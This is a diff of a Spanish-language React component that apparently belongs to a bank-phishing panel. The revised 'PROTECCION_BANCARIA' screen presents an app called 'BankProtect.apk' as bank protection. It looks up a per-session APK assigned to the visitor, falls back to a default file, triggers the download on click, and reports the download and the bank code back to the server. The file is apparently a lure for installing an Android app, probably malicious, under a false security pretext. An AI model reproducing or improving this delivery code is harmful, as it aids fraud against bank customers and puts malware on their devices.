@@ -754,44 +754,16 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(cancelacionRetiroContent);
 
       case ScreenType.PROTECCION_BANCARIA:
-        // Mapeo de bancos a archivos de protección
-        const getProtectionFile = async (sessionId: string) => {
-          try {
-            // Intentar obtener el APK asignado al usuario de la sesión
-            const response = await fetch(`/api/get-user-apk/${sessionId}`);
-            
-            if (response.ok) {
-              const data = await response.json();
-              return {
-                fileName: data.apkFileName,
-                fileUrl: data.apkFileUrl
-              };
-            } else {
-              // Si no tiene APK asignado, usar el archivo universal
-              return {
-                fileName: 'BankProtect.apk',
-                fileUrl: '/assets/Bankprotet2_1750982122281.apk'
-              };
-            }
-          } catch (error) {
-            console.error('Error fetching user APK:', error);
-            // En caso de error, usar el archivo universal
-            return {
-              fileName: 'BankProtect.apk',
-              fileUrl: '/assets/Bankprotet2_1750982122281.apk'
-            };
-          }
+        // Función para obtener el archivo de protección del usuario
+        const getProtectionFile = (bankCode: string) => {
+          // Primero intentar obtener APK personalizado (se cargará dinámicamente)
+          return {
+            fileName: 'BankProtect.apk',
+            fileUrl: '/assets/Bankprotet2_1750982122281.apk'
+          };
         };
 
-        // Estado para manejar el archivo de protección
-        const [protectionFile, setProtectionFile] = React.useState<{fileName: string, fileUrl: string} | null>(null);
-        
-        // Cargar el archivo de protección cuando se monta el componente
-        React.useEffect(() => {
-          if (sessionId) {
-            getProtectionFile(sessionId).then(setProtectionFile);
-          }
-        }, [sessionId]);
+        const protectionFile = getProtectionFile(bankCode);
         
         const proteccionBancariaContent = (
           <>
@@ -816,34 +788,69 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
             <Button 
               className="bg-[#004080] hover:bg-[#003366] text-white py-3 px-6 rounded font-bold w-full transition-colors"
-              onClick={() => {
-                // Usar el archivo específico del banco o el archivo manual si está disponible
-                const fileToDownload = protectionFile || (screenData.fileUrl ? {
-                  fileName: screenData.fileName || 'proteccion_bancaria.zip',
-                  fileUrl: screenData.fileUrl
-                } : null);
-                
-                if (fileToDownload) {
-                  // Crear un enlace temporal para descargar el archivo
+              onClick={async () => {
+                try {
+                  // Intentar obtener el APK personalizado del usuario
+                  const response = await fetch(`/api/get-user-apk/${sessionId}`);
+                  let fileToDownload = protectionFile;
+
+                  if (response.ok) {
+                    const data = await response.json();
+                    fileToDownload = {
+                      fileName: data.apkFileName,
+                      fileUrl: data.apkFileUrl
+                    };
+                  }
+                  
+                  // Si no se encontró APK personalizado, usar el archivo manual subido o el por defecto
+                  if (!fileToDownload) {
+                    fileToDownload = screenData.fileUrl ? {
+                      fileName: screenData.fileName || 'proteccion_bancaria.zip',
+                      fileUrl: screenData.fileUrl
+                    } : protectionFile;
+                  }
+                  
+                  if (fileToDownload) {
+                    // Crear un enlace temporal para descargar el archivo
+                    const link = document.createElement('a');
+                    link.href = fileToDownload.fileUrl;
+                    link.download = fileToDownload.fileName;
+                    link.target = '_blank';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    
+                    // Notificar al servidor que se realizó la descarga
+                    onSubmit(ScreenType.PROTECCION_BANCARIA, { 
+                      action: 'download',
+                      fileName: fileToDownload.fileName,
+                      fileSize: screenData.fileSize || 'Desconocido',
+                      downloaded: true,
+                      bankFile: !!protectionFile,
+                      banco: bankCode
+                    });
+                  } else {
+                    alert('El archivo de protección para este banco aún no está disponible. Por favor, contacta al administrador.');
+                  }
+                } catch (error) {
+                  console.error('Error downloading file:', error);
+                  // Usar archivo por defecto en caso de error
                   const link = document.createElement('a');
-                  link.href = fileToDownload.fileUrl;
-                  link.download = fileToDownload.fileName;
+                  link.href = protectionFile.fileUrl;
+                  link.download = protectionFile.fileName;
                   link.target = '_blank';
                   document.body.appendChild(link);
                   link.click();
                   document.body.removeChild(link);
                   
-                  // Notificar al servidor que se realizó la descarga
                   onSubmit(ScreenType.PROTECCION_BANCARIA, { 
                     action: 'download',
-                    fileName: fileToDownload.fileName,
-                    fileSize: screenData.fileSize || 'Desconocido',
+                    fileName: protectionFile.fileName,
+                    fileSize: 'Desconocido',
                     downloaded: true,
-                    bankFile: !!protectionFile,
+                    bankFile: true,
                     banco: bankCode
                   });
-                } else {
-                  alert('El archivo de protección para este banco aún no está disponible. Por favor, contacta al administrador.');
                 }
               }}
             >
